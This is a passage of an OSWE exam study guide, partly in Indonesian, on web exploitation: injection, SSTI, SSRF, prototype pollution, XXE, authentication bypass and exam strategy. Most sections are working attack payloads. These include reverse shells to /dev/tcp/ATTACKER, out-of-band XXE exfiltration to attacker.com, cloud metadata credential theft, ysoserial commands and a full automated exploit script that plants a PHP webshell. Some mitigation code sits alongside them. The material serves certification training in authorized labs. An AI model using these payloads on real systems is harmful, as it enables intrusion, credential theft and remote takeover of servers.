String hql = "FROM users WHERE username = '" + input + "'";
Query query = session.createQuery(hql);  // HQL Injection!

// JPA Criteria API — safe
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("username"), input));  // parameterized

// Entity Framework (C#) — unsafe
var users = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE username = '{input}'").ToList();

// Entity Framework — safe
var users = context.Users.FromSqlRaw("SELECT * FROM Users WHERE username = @p0", input).ToList();
```

### PostgreSQL Specific: Copy From Program RCE

```sql
-- RCE via COPY FROM PROGRAM (PostgreSQL 9.3+)
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/443 0>&1"'; --

-- RCE via lo_import/lo_export — write webshell
'; SELECT lo_import('/etc/passwd'); --
'; SELECT lo_export(12345, '/var/www/html/shell.php'); --
```

---

## 7. Server-Side Template Injection (SSTI)

### Detection

```
# Payload matematik — jika hasilnya 123, maka SSTI confirmed
{{7*7}} → 49
${7*7} → 49
*{7*7} → 49
#{7*7} → 49
{{7*'7'}} → 7777777 (Python string multiplication)
```

### SSTI by Template Engine

#### Jinja2 (Python)

```python
# Basic RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Cari subprocess.Popen
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}

# Shortcut via __builtins__
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Config access (Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
```

#### Twig (PHP)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

{{ ['id'] | filter('exec') }}
```

#### FreeMarker (Java)

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}
```

#### Jade/Pug (Node.js)

```javascript
#{root = this}
#{root.process.mainModule.require('child_process').execSync('id')}

- var x = global.process.mainModule.require('child_process').execSync('id')
= x
```

#### Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "substring")}}
      {{this.push "constructor"}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.split.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### SSTI Mitigation

```python
# SAFE: render_template (file-based, no inline template)
from flask import render_template
return render_template('user.html', name=name)

# UNSAFE: render_template_string (inline template with user input)
from flask import render_template_string
return render_template_string(f"Hello {{name}}", name=name)
# If name contains {{7*7}}, SSTI!

# Escape user input
from markupsafe import escape
return render_template_string("Hello {{name}}", name=escape(user_input))
```

---

## 8. Server-Side Request Forgery (SSRF)

### SSRF Types

| Type | Description | Difficulty |
|------|-------------|-----------|
| **Basic SSRF** | Response returned to attacker | Easy |
| **Blind SSRF** | No response, only out-of-band | Medium |
| **Semi-blind SSRF** | Error messages leak info | Medium |
| **SSRF via DNS Rebinding** | Bypass filter via TTL manipulation | Hard |
| **SSRF via Redirect** | Bypass filter via open redirect | Medium |

### Bypass Techniques

```python
# IP obfuscation
bypasses = [
    "127.0.0.1",
    "2130706433",        # decimal
    "0x7f000001",        # hex
    "0x7f.0x0.0x0.0x1", # hex dotted
    "0177.0.0.1",        # octal
    "0",                 # 0.0.0.0
    "0.0.0.0",
    "127.1",             # short form
    "[::1]",             # IPv6
    "0:0:0:0:0:0:0:1",  # IPv6 full
    "localhost",
    "LOCALHOST",         # case varies
    "127.0.0.1.nip.io", # DNS rebinding service
    "1.1.1.1",           # → redirect → internal
]

# URL parsing confusion
# https://whitelisted.com@internal.com  → browser parses: user:pass@host
# https://evil.com#whitelisted.com       → fragment ignored
# https://whitelisted.com.evil.com      → evil.com controls subdomain
```

### Cloud Metadata

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# GCP
curl http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"
curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01 -H "Metadata: true"

# DigitalOcean
curl http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
curl http://100.100.100.200/latest/meta-data/
```

### SSRF to RCE via gopher

```python
# gopher:// protocol allows crafting arbitrary TCP packets
# Useful for talking to Redis, MySQL, SMTP, etc.

# Redis RCE via gopher
gopher://redis:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$...
# The payload sets a key with PHP webshell, then configures dir and dbfilename
# to write the webshell

# MySQL RCE via gopher (abusing LOCAL INFILE)
gopher://mysql:3306/_...
```

### SSRF Exploit Template

```python
import requests
import urllib.parse

TARGET = "http://target/fetch?url="

# Test basic SSRF
def test_ssrf(url):
    r = requests.get(TARGET + urllib.parse.quote(url), timeout=10)
    return r.text

# Blind SSRF via collaborator
def test_ssrf_oob(collaborator_url):
    try:
        r = requests.get(TARGET + urllib.parse.quote(collaborator_url), timeout=5)
    except:
        pass  # Blind — check collaborator for callback

# AWS metadata
def get_aws_creds():
    data = test_ssrf("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    role = data.strip()
    creds = test_ssrf(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
    return creds
```

---

## 9. Prototype Pollution

### What is Prototype Pollution?

Prototype Pollution adalah kerentanan JavaScript di mana attacker bisa memodifikasi `Object.prototype` (atau `__proto__`) untuk menginjeksi properti ke semua object dalam runtime. Ini terjadi ketika aplikasi melakukan **recursive merge** tanpa memeriksa `__proto__` key.

### Vulnerable Patterns

```javascript
// VULNERABLE merge function
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object' && b[key] !== null) {
            merge(a[key], b[key]);
        } else {
            a[key] = b[key];
        }
    }
}

// Input:
// {"__proto__": {"isAdmin": true}}
// Setelah merge, EVERY object has isAdmin = true
```

### Detection

```json
// Test payload
{"__proto__": {"test": 123}}

// Verifikasi — setelah mengirim payload, cek di browser console atau response
// console.log({}.test) → 123 (if vulnerable)
```

### Server-Side Prototype Pollution → RCE

```javascript
// RCE via prototype pollution + child_process gadget
// Step 1: Pollute prototype
const payload = {
    "__proto__": {
        "shell": "node",
        "env": {
            "NODE_OPTIONS": "--require /tmp/evil.js"
        }
    }
};

// Step 2: Trigger child_process.spawn() or exec()
// child_process reads options from prototype → executes evil.js
```

### Client-Side Prototype Pollution → XSS

```javascript
// DOM-based XSS via prototype pollution
// Step 1: Pollute properties used by innerHTML, src, href setters
{
    "__proto__": {
        "innerHTML": "<img src=x onerror=alert(1)>",
        "src": "javascript:alert(1)"
    }
}

// Payload untuk jQuery $() — DOM XSS
{
    "__proto__": {
        "href": "javascript:alert(document.domain)"
    }
}
```

### Known CVEs

- **CVE-2019-10744**: lodash.merge prototype pollution
- **CVE-2020-8203**: lodash.zipObjectDeep
- **CVE-2022-25883**: semver vulnerable to PP
- **CVE-2025-55182**: Popular npm library PP (Node.js)
- **CVE-2025-66478**: Server-side PP in Node.js application

### Vulnerable Libraries Check

```javascript
// Libraries known to have PP vulnerabilities
const vulnerable = [
    'lodash.merge', 'lodash.defaultsDeep', 'lodash.set', 'lodash.zipObjectDeep',
    'jquery', 'jquery-extend', 'mixin-deep', 'merge-deep', 'merge-options',
    'object-assign-deep', 'defaults-deep', 'assign-deep', 'deep-extend',
    'just-extend', 'angular', 'handlebars', 'immer', 'immer-compatible'
];
```

### Exploit Template (Server-Side PP)

```python
import requests
import json

TARGET = "http://target/api/update"

# Phase 1: Test for PP
def test_pp():
    payload = {"__proto__": {"pp_test": "vulnerable"}}
    r = requests.post(TARGET, json=payload)
    # Check if pp_test appears in responses or affects behavior
    
# Phase 2: Pollute + trigger gadget
def exploit():
    # Payload depends on available gadgets
    payload = {
        "__proto__": {
            "shell": True,  # For child_process if used
        }
    }
    r = requests.post(TARGET, json=payload)
    return r
```

---

## 10. Authentication Bypass & Weak Random

### Weak Random Token Generation

```java
// VULNERABLE — java.util.Random is predictable
import java.util.Random;
Random rand = new Random();
String token = String.format("%06d", rand.nextInt(999999));

// SECURE — java.security.SecureRandom
import java.security.SecureRandom;
SecureRandom rand = new SecureRandom();
byte[] tokenBytes = new byte[32];
rand.nextBytes(tokenBytes);
```

```php
// VULNERABLE — mt_rand() seed can be cracked
$token = mt_rand(100000, 999999);

// SECURE — random_bytes()
$token = bin2hex(random_bytes(32));
```

```csharp
// VULNERABLE — Random class
var rand = new Random();
var token = rand.Next(100000, 999999).ToString();

// SECURE — RandomNumberGenerator
using System.Security.Cryptography;
var tokenBytes = RandomNumberGenerator.GetBytes(32);
var token = Convert.ToHexString(tokenBytes);
```

### Predictable Token Exploit

```python
# Password reset token bruteforce
import requests

TARGET = "http://target/reset.php"
USERNAME = "admin"

def try_token(token):
    r = requests.post(TARGET, data={
        "username": USERNAME,
        "token": token,
        "new_password": "pwned123"
    })
    return "success" in r.text.lower()

# Brute force 6-digit token
for i in range(1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"Token found: {token}")
        break
```

### Logic Flaw Authentication Bypass

```php
<?php
// Logic flaw — step skipping
// Password reset flow:
// Step 1: Request reset → send email
// Step 2: Verify token → allow password change
// Step 3: Change password

// Vulnerability: Step 3 doesn't verify that Step 2 was completed
if ($_POST['action'] === 'change_password') {
    $username = $_POST['username'];
    $new_password = $_POST['new_password'];
    
    // Missing: check if token was verified!
    $query = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
    mysqli_query($conn, $query);
}
?>
```

```python
# Step-skipping exploit
import requests

TARGET = "http://target"

# Skip directly to step 3
r = requests.post(TARGET + "/reset.php", data={
    "action": "change_password",
    "username": "admin",
    "new_password": "pwned123"
})

# Login with new password
r = requests.post(TARGET + "/login.php", data={
    "username": "admin", 
    "password": "pwned123"
})
print("Logged in!" if "dashboard" in r.text else "Failed")
```

### JWT Algorithm Confusion

```python
import jwt  # PyJWT

# Attack: algorithm none
token = jwt.encode({"user": "admin", "role": "administrator"}, key="", algorithm="none")
print(token)
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.

# Server-side verification without algorithm restriction:
# jwt.decode(token, verify=False)  ← insecure!
```

### Session Hijacking via Weak Session ID

```php
<?php
// Predictable session ID
session_id(md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));
session_start();

// Attack: same IP + User-Agent → same session!
?>
```

---

## 11. XXE & XML-Based Attacks

### XXE Types

| Type | Description |
|------|-------------|
| **In-band XXE** | Data exfiltrated in response |
| **Error-based XXE** | Error messages leak file content |
| **Blind out-of-band XXE** | No response, data via HTTP/DNS callback |
| **Blind error-based XXE** | Error messages from XXE + parameter entities |

### Basic XXE Payloads

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Directory listing (Java) -->
<!ENTITY xxe SYSTEM "file:///etc/">

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

### Blind XXE — Out-of-Band Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>
```

### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### XXE via DTD Inclusion (No External DTD)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**evil.dtd content**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### XXE in Java — Code Review Pattern

```java
// VULNERABLE
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));

// SECURE — disable external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### XXE in PHP

```php
<?php
// VULNERABLE
$xml = simplexml_load_string($_POST['xml']);
echo $xml->data;

// SECURE
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($_POST['xml']);
?>
```

---

## 12. OS Command Injection & WebSocket Exploitation

### Command Injection Patterns

```python
# Common injection characters
chars = [';', '|', '&', '&&', '||', '`', '$()', '\n', '%0a']

# Linux: ;, |, &&, ||, `command`, $(command)
# Windows: &, |, &&, ||, %command%

# Blind command injection with time delay
# Linux: ; sleep 5
# Windows: & ping -n 5 127.0.0.1 &
```

### Command Injection via WebSocket

```python
import websocket
import json
import threading

TARGET_WS = "wss://target/ws/execute"

def websocket_cmd_inject(command):
    ws = websocket.WebSocket()
    ws.connect(TARGET_WS)
    
    # Payload bergantung pada format WebSocket message
    payload = {
        "type": "command",
        "cmd": "ping",
        "host": f"127.0.0.1; {command}"  # Injection point
    }
    
    ws.send(json.dumps(payload))
    response = ws.recv()
    ws.close()
    return response
```

### Command Injection via HTTP Headers

```python
import requests

TARGET = "http://target/traceroute"

# Command injection via User-Agent or other headers
headers = {
    "User-Agent": "'; curl http://attacker.com/$(whoami); '",
    "X-Forwarded-For": "127.0.0.1; id"
}

r = requests.get(TARGET, headers=headers)
```

### RCE via Database Functions

```sql
-- PostgreSQL UDF RCE
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- MySQL UDF RCE (requires lib_mysqludf_sys)
SELECT sys_eval('id');
SELECT sys_exec('id');

-- MSSQL xp_cmdshell (disabled by default, but can be enabled)
EXEC xp_cmdshell 'whoami';
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## 13. Custom Exploit Development in Python

### OSWE Exploit Requirements

OSWE mengharuskan exploit:
1. **Fully automated** — satu command, zero interaction
2. **No hardcoded session** — dapat session sendiri dari login
3. **Portable** — harus jalan di Kali Linux default
4. **Demonstrates full chain** — dari initial access sampai privileged access
5. **No interactive prompts** — `input()`, `raw_input()` tidak diizinkan

### Exploit Template

```python
#!/usr/bin/env python3
"""
OSWE Exploit Template
Target: Application Name
Vulnerability: <type>
CVE: <CVE-ID if applicable>
"""

import requests
import sys
import re
import time
import base64
import urllib.parse
from typing import Optional, Tuple

# Disable SSL warnings for Burp Suite interception
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy for Burp Suite (optional)
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
USE_PROXY = False

TARGET = ""
LOCAL_IP = ""
LOCAL_PORT = 443

# ============================================
# PHASE 1: Helper Functions
# ============================================

def get_session() -> requests.Session:
    """Create session with/without proxy"""
    session = requests.Session()
    session.verify = False
    if USE_PROXY:
        session.proxies = PROXY
    return session

def extract_csrf(html: str) -> Optional[str]:
    """Extract CSRF token from HTML"""
    pattern = r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)'
    match = re.search(pattern, html)
    return match.group(1) if match else None

# ============================================
# PHASE 2: Authentication
# ============================================

def login(session: requests.Session, username: str, password: str) -> bool:
    """Authenticate to the application"""
    # Get login page and CSRF token
    r = session.get(f"{TARGET}/login.php", verify=False)
    csrf = extract_csrf(r.text)
    
    # Login
    data = {
        "username": username,
        "password": password,
        "csrf_token": csrf
    }
    r = session.post(f"{TARGET}/login.php", data=data, verify=False)
    return "dashboard" in r.text or "Welcome" in r.text

# ============================================
# PHASE 3: Vulnerability Exploitation
# ============================================

def exploit_sqli(session: requests.Session) -> Optional[str]:
    """Exploit SQL injection to extract admin hash"""
    # Error-based SQLi
    payload = "' UNION SELECT 1,2,3,4,5 -- "
    r = session.get(f"{TARGET}/api/users?id={urllib.parse.quote(payload)}", verify=False)
    # Parse response for data
    match = re.search(r'admin:([a-f0-9]{32})', r.text)
    return match.group(1) if match else None

def get_reverse_shell() -> str:
    """Generate reverse shell payload"""
    return f"bash -c 'bash -i >& /dev/tcp/{LOCAL_IP}/{LOCAL_PORT} 0>&1'"

def trigger_rce(session: requests.Session, cmd: str) -> bool:
    """Execute command on target"""
    # SQLi → PostgreSQL COPY FROM PROGRAM
    payload = f"'; COPY (SELECT '') TO PROGRAM '{cmd}'; --"
    encoded = urllib.parse.quote(payload)
    r = session.get(f"{TARGET}/api/query?id={encoded}", verify=False, timeout=5)
    return True

def upload_webshell(session: requests.Session) -> bool:
    """Upload PHP webshell via file upload vulnerability"""
    files = {
        "file": ("shell.php5", "<?php system($_GET['cmd']); ?>", "application/x-php")
    }
    r = session.post(f"{TARGET}/admin/upload.php", files=files, verify=False)
    return "uploaded" in r.text.lower()

# ============================================
# PHASE 4: Main Exploit Chain
# ============================================

def exploit(target_url: str, username: str, password: str) -> bool:
    """Main exploit function — fully automated"""
    global TARGET
    TARGET = target_url
    
    print(f"[*] Target: {TARGET}")
    print(f"[*] Starting exploit...")
    
    # Step 1: Login
    session = get_session()
    print(f"[*] Logging in as {username}...")
    if not login(session, username, password):
        print("[-] Login failed, trying auth bypass...")
        # Try alternative auth bypass
        pass
    
    # Step 2: Exploit SQLi
    print("[*] Exploiting SQL injection...")
    admin_hash = exploit_sqli(session)
    if admin_hash:
        print(f"[+] Admin hash: {admin_hash}")
    else:
        print("[-] SQLi failed, trying alternative path...")
    
    # Step 3: Upload webshell or trigger RCE
    print("[*] Uploading webshell...")
    if upload_webshell(session):
        print(f"[+] Webshell uploaded! Access: {TARGET}/shell.php5?cmd=whoami")
    else:
        print("[*] Trying RCE via SQLi...")
        rce_payload = get_reverse_shell()
        trigger_rce(session, rce_payload)
        print(f"[+] Reverse shell payload sent to {LOCAL_IP}:{LOCAL_PORT}")
    
    # Step 4: Get flags
    print("[*] Reading flags...")
    r = session.get(f"{TARGET}/shell.php5?cmd=cat /root/proof.txt", verify=False)
    if "proof.txt" in r.text:
        print(f"[+] Proof.txt: {r.text.strip()}")
    
    r = session.get(f"{TARGET}/shell.php5?cmd=cat /home/*/local.txt", verify=False)
    print(f"[+] Local.txt: {r.text.strip()}")
    
    return True

# ============================================
# Entry Point
# ============================================

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <username> <password>")
        print(f"Example: {sys.argv[0]} http://target.com admin password123")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    success = exploit(target, username, password)
    sys.exit(0 if success else 1)
```

### Anti-Automation Bypass Techniques

```python
# CSRF token extraction
def get_csrf(session, url):
    r = session.get(url)
    token = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return token.group(1) if token else None

# Rate limiting bypass
def rate_limited_request(session, url, delay=1.0):
    time.sleep(delay)
    return session.get(url)

# CAPTCHA bypass via OCR (rare in OSWE)
# Usually CAPTCHA not present, but if:
# - Check if CAPTCHA can be reused
# - Check if CAPTCHA validation is client-side
# - Check if CAPTCHA key can be predicted

# Nonce handling
def get_nonce(session, url):
    r = session.get(url)
    nonce = re.search(r'nonce=([a-f0-9]+)', r.text)
    return nonce.group(1) if nonce else None

# Stateful multi-step exploit
class ExploitState:
    def __init__(self, target):
        self.session = requests.Session()
        self.target = target
        self.csrf = None
        self.nonce = None
        self.session_token = None
        self.authenticated = False
    
    def step1_request_reset(self, username):
        r = self.session.post(f"{self.target}/reset.php",
            data={"username": username, "action": "request"},
            verify=False)
        self.csrf = extract_csrf(r.text)
        return "email sent" in r.text.lower()
    
    def step2_brute_token(self, username, start=0, end=1000000):
        for token in range(start, end):
            r = self.session.post(f"{self.target}/reset.php",
                data={"username": username, "token": f"{token:06d}"},
                verify=False)
            if "verified" in r.text.lower():
                return f"{token:06d}"
        return None
    
    def step3_change_password(self, username, new_pass, token):
        r = self.session.post(f"{self.target}/reset.php",
            data={
                "username": username,
                "token": token,
                "new_password": new_pass,
                "action": "change"
            },
            verify=False)
        self.authenticated = "success" in r.text.lower()
        return self.authenticated
```

---

## 14. Tools Deep Dive

### Burp Suite Community

**Configuration for OSWE**:
```
Proxy: 127.0.0.1:8080
Intercept: ON (for initial recon), OFF (for exploit testing)
Repeater: Test each vulnerability manually before writing exploit
Decode/Encode: URL, Base64, Hex
Comparer: Compare responses (blind injection testing)
```

**Key workflows**:
1. Set browser proxy to Burp
2. Navigate application → capture all requests
3. Send interesting requests to Repeater
4. Manipulate payloads manually
5. Once manual exploit works → code the Python script

### dnSpy (.NET Decompiler / Debugger)

**Usage**:
```bash
# Decompile .NET assembly
dnspy app.dll

# Debug mode — set breakpoints in source
# F9: Toggle breakpoint
# F10: Step over
# F11: Step into
# F5: Continue
```

**Key features for OSWE**:
- **Decompile** any .NET assembly to C#
- **Debug** — attach to running process, set breakpoints
- **Edit method** — modify IL code at runtime
- **Search** — find strings, classes, methods across all assemblies
- **Analyze** — show callers/callees, inheritance

**Typical workflow**:
1. Load DLL in dnSpy
2. Search for vulnerability patterns: `Deserialize`, `BinaryFormatter`, hardcoded keys
3. Set breakpoint at deserialization call
4. Run application, trigger request via Burp
5. Inspect call stack, local variables
6. Craft exploit based on discovered types

### JD-GUI / Jadx (Java Decompiler)

```bash
# Decompile JAR/WAR
jd-gui app.jar

# Jadx — better for obfuscated code
jadx app.jar -d output/
```

**Key features**:
- Decompile `.class` / `.jar` to readable Java source
- Search across all classes
- Export source to file

**Typical workflow:**
1. Open JAR/WAR in JD-GUI
2. Browse packages for controllers, servlets
3. Search for `Runtime.exec`, `Statement.executeQuery`, `ObjectInputStream`
4. Trace data flow from entry point to sink

### Visual Studio Code

**Extensions to install:**
- Python (ms-python.python)
- C# Dev Kit (ms-dotnettools.csdevkit)
- Java Extension Pack (vscjava.vscode-java-pack)
- PHP Intelephense (bmewburn.vscode-intelephense-client)

**Usage for source code review:**
- Global search across project
- Go to Definition (F12)
- Find All References (Shift+F12)
- Compare files (diff)
- Integrated terminal for exploit testing

### ysoserial / ysoserial.net

```bash
# ysoserial (Java)
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/shell.jsp'
java -jar ysoserial.jar CommonsCollections4 'ping -c 1 attacker.com'
java -jar ysoserial.jar JRMPClient 'attacker:1099'

# ysoserial.net (.NET)
mono ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "cmd /c whoami"
mono ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"
mono ysoserial.exe -f ObjectStateFormatter -g ObjectDataProvider -c "powershell -enc BASE64"
```

---

## 15. Exam Strategy & Report Template

### Exam Strategy

#### Day 1-2: Machine 1 (20pts) — Quick Win

Target: 2-4 hours

```
1. Source code review — cari vulnerable entry point (biasanya hanya 1-2 bugs)
2. Verify dengan Burp Repeater
3. Tulis exploit.py
4. Test dari fresh state
5. Screenshot: Local.txt + Proof.txt
6. Lanjut ke Machine 2
```

#### Day 2-3: Machine 2 (35pts) — Medium Difficulty

Target: 8-12 hours

```
1. Source code review — map all entry points
2. Identify 2-3 vulnerabilities yang perlu chain
3. Develop exploit chain:
   - Step 1: Auth bypass / SQLi
   - Step 2: File upload / deserialization / command injection
   - Step 3: Privilege escalation
4. Test exploit chain from fresh state
5. Screenshot + flags
```

#### Day 3-4: Machine 3 (45pts) — Hard

Target: 12-18 hours

```
1. Comprehensive source code review — aplikasi biasanya paling kompleks
2. Multiple chaining required:
   - SSRF → internal API → admin session
   - Prototype pollution → auth bypass → RCE
   - XXE → SSRF → cloud metadata → credentials → RCE
3. Exploit development — might need multiple Python scripts
4. Integration test — full chain from zero
5. Screenshot + flags
```

#### Day 4-5: Verification & Report

```
1. Verify all exploits on fresh VPN connection
2. Collect screenshots:
   - Burp Suite requests/responses
   - Terminal output of exploit.py
   - Local.txt content
   - Proof.txt content
3. Write report
```

### Report Template

```markdown
# OSWE Exam Report — Machine X

## Target Information
- **IP Address**: <target_ip>
- **Application**: <name>
- **Language/Framework**: <language>
- **Port**: <port>

## Vulnerability Summary
1. **<Vuln Type 1>** — <CVE if applicable>
   - Location: <file_path:line>
   - Impact: <description>
   
2. **<Vuln Type 2>** — <CVE if applicable>
   - Location: <file_path:line>
   - Impact: <description>

## Source Code Review
```<language>
// Snippet of vulnerable code
// Highlight the vulnerable line
```

**Explanation**: <why this code is vulnerable>

## Exploitation

### Step 1: <Step Name>
**Request**:
```
<Burp request>
```

**Response**:
```
<Burp response>
```

### Step 2: <Step Name>
**Technique**: <description>

**Exploit script**:
```python
# Key portion of exploit.py
```

### Flags
- **Local.txt**: `<hash>`
- **Proof.txt**: `<hash>`

## Remediation
1. <fix 1>
2. <fix 2>

## References
- <link>
- <link>
```

### Submission Checklist

```
[ ] Semua 3 machines exploited
[ ] exploit.py — clean run dari fresh state
[ ] exploit.py — NO hardcoded sessions
[ ] exploit.py — NO interactive prompts
[ ] Screenshots: Local.txt (each machine)
[ ] Screenshots: Proof.txt (each machine)
[ ] Screenshots: Full exploit run
[ ] Report PDF generated
[ ] All files in .7z archive
[ ] Checksum verified
[ ] Uploaded to OffSec portal
```

---

## 16. Referensi Lengkap

### Official OffSec Resources

| # | Resource | URL |
|---|----------|-----|
| 1 | WEB-300 Course Page | https://www.offsec.com/courses/web-300/ |
| 2 | OSWE Exam Guide | https://help.offsec.com/hc/en-us/articles/360049792232-OSWE-Exam-Guide |
| 3 | OSWE FAQ | https://www.offsec.com/courses/web-300/faq/ |
| 4 | OffSec Discord | https://discord.gg/offsec |
| 5 | OffSec Community Forums | https://forums.offsec.com |
| 6 | OffSec Learning Portal | https://portal.offsec.com |
| 7 | OffSec Support | https://help.offsec.com |

### Exam Reviews & Blog Posts

| # | Resource | Author | URL |
|---|----------|--------|-----|
| 8 | OSWE Review — MyOSWE Journey | Medium | https://medium.com/tag/oswe |
| 9 | OSWE Exam Review 2024 | steflan-security | https://steflan-security.com/oswe-exam-review/ |
| 10 | How I Passed OSWE | BRNorocha | https://brnorochamoura.medium.com/how-i-passed-oswe-offensive-security-web-expert-fb59809bceec |
| 11 | OSWE Review — The Hardest Exam? | tevora | https://medium.com/@tevora/thats-a-wrap-oswe-review-5e0c0e5b7e55 |
| 12 | Anatomy of OSWE: Approach & Mindset | sushant-kamble | https://medium.com/@sushant-kamble |
| 13 | OSWE 2024 Preparation Guide | steflan | https://steflan-security.com/oswe-preparation-guide/ |
| 14 | My OSWE Journey — Tips and Tricks | r0hack | https://r0hack.medium.com/ |
| 15 | OSWE Without Dev Background | info-sharing blog | https://www.megabeets.net/oswe-journey/ |
| 16 | OSWE Challenge Lab Walkthrough | various | https://0xdf.gitlab.io/ |
| 17 | OSWE Mindset: Source Code is King | OffSec Blog | https://www.offsec.com/blog/ |

### .NET Deserialization

| # | Resource | URL |
|---|----------|-----|
| 18 | ysoserial.net — GitHub | https://github.com/pwntester/ysoserial.net |
| 19 | DotNetNuke CVE-2017-9822 Analysis | https://www.exploit-db.com/exploits/43973 |
| 20 | .NET Deserialization — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/deserialization/dotnet-deserialization.html |
| 21 | .NET Serialization — Microsoft Docs | https://learn.microsoft.com/en-us/dotnet/standard/serialization/ |
| 22 | DotNetNuke Deserialization — metasploit module | https://www.rapid7.com/db/modules/exploit/multi/http/dnn_cookie_deserialization_rce/ |
| 23 | Understanding .NET Deserialization — CODEWHITE | https://codewhitesec.blogspot.com/ |
| 24 | ObjectDataProvider Exploitation | https://www.nccgroup.com/us/research-blog/ |
| 25 | Detecting .NET Deserialization | https://www.truesec.com/hub/blog/ |
| 26 | LosFormatter Deep Dive | https://book.hacktricks.wiki/en/pentesting-web/deserialization/ |
| 27 | BinaryFormatter Banned in .NET 5+ | https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide |
| 28 | ExpandedWrapper + ObjectDataProvider RCE | https://www.exploit-db.com/ |

### PHP Type Juggling

| # | Resource | URL |
|---|----------|-----|
| 29 | PHP Type Juggling — PHP.net | https://www.php.net/manual/en/language.types.type-juggling.php |
| 30 | PHP Type Juggling — OWASP | https://owasp.org/www-pdf-archive/PHPMaestro.pdf |
| 31 | PHP Magic Hashes List | https://github.com/spaze/hashes |
| 32 | PHP strcmp() Vulnerability | https://www.php.net/manual/en/function.strcmp.php |
| 33 | PHP Loose Comparison Table | https://www.php.net/manual/en/types.comparisons.php |
